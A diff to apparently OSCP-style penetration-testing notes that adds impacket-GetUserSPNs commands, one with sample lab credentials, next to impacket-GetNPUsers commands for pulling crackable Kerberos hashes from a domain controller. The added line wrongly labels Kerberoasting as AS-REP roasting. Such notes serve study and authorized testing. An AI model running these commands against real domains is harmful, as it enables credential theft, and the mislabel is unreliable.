@@ -268,6 +268,11 @@ a. Network Exploitation
 		Using GetNPUsers.py -- used to get user accounts that do not have Kerberos Pre-Authentication to obtain TGTs for offline password cracking attempts:
 		impacket-GetNPUsers -dc-ip 192.168.64.141 netsec.local/ -usersfile users -request
 
+		Can use below also to AS-REP Kerberoast!
+		impacket-GetUserSPNs <Domain/Username:password> -dc-ip <ip of DC> -request
+		impacket-GetUserSPNs oscp.exam/web_svc:Diamond1 -dc-ip 10.10.174.146 -request
+		
+
 		AS-REP KERBEROASTING:
 		impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
 		PASSWORD?:
